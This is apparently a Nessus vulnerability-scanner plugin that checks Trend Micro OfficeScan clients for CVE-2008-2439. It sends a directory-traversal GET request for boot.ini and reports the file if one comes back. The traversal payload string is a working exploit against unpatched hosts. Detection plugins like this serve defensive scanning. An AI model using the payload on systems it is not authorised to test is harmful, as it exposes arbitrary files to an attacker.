#
#  (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(34362);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2008-2439");
  script_bugtraq_id(31531);
  script_osvdb_id(48730);
  script_xref(name:"Secunia", value:"31343"); 

  script_name(english:"Trend Micro OfficeScan Client Traversal Arbitrary File Access");
  script_summary(english:"Exploits a directory traversal issue in Trend Micro OfficeScan Client");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a directory traversal issue." );
 script_set_attribute(attribute:"description", value:
"The version of Trend Micro OfficeScan client running on the remote
host is affected by a directory traversal issue that can be
leveraged by an unauthenticated, remote attacker to read arbitrary
files on the remote host. 

Note that successful exploitation requires that 'Tmlisten.exe' be
configured to receive updates from other clients." );
 script_set_attribute(attribute:"see_also", value:"http://secunia.com/secunia_research/2008-39/" );
  # http://www.trendmicro.com/ftp/documentation/readme/OSCE_7.3_Win_EN_CriticalPatch_B1372_Readme.txt
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?14a47516");
  # http://www.trendmicro.com/ftp/documentation/readme/OSCE_8.0_SP1_Win_EN_CriticalPatch_B2439_Readme.txt
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b5493c8c");
  # http://www.trendmicro.com/ftp/documentation/readme/OSCE8.0_SP1_Patch1_CriticalPatch_3087_Readme.txt
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?c957bae3");
  # http://www.trendmicro.com/ftp/documentation/readme/Readme_WFBS5.0_EN_CriticalPatch1414.txt
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?cabe4087");
 script_set_attribute(attribute:"solution", value:
"Upgrade to : 

 - Trend Micro OfficeScan 7.3 Build 3172.
 - Trend Micro OfficeScan 8.0 Build 2439/3087
   depending on the current OfficeScan patch level.
 - Worry-Free Business Security 5.0 Build 1414." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");
script_cwe_id(22);

 script_set_attribute(attribute:"plugin_publication_date", value: "2008/10/08");
 script_set_attribute(attribute:"patch_publication_date", value: "2008/09/30");
 script_cvs_date("$Date: 2015/09/24 23:21:21 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:trend_micro:officescan");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2008-2015 Tenable Network Security, Inc.");
  script_dependencies("officescan_detect.nasl");
  script_require_ports("TrendMicro/OfficeScanClient");

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_kb_item("TrendMicro/OfficeScanClient");
if (!port) exit(0);
if (! get_port_state(port)) exit(0);

exploit = "/activeupdate/../../../../../../../../../../../boot.ini";
w = http_send_recv3(method:"GET", item:exploit,port:port);
if (isnull(w)) exit(1, "the web server did not answer");
res = w[2];

  if ("[boot loader]" >< res && "[operating systems]" >< res )
  {
    # We got a problem here....report
    if (report_verbosity)
    {
      report = string(
        "\n",
        "Nessus could get the contents of 'boot.ini' using the following\n",
        "URL : \n",
        "\n",
        "  ", build_url(port:port, qs:exploit),'\n',
        '\n'
      );
      if (report_verbosity > 1)
      {
        report = string(
          report,
          "\n",
          "Here are the contents :\n",
          "\n",
          res
        );
      }
      security_warning(port:port,extra:report);
    }
    else security_warning(port);
  }
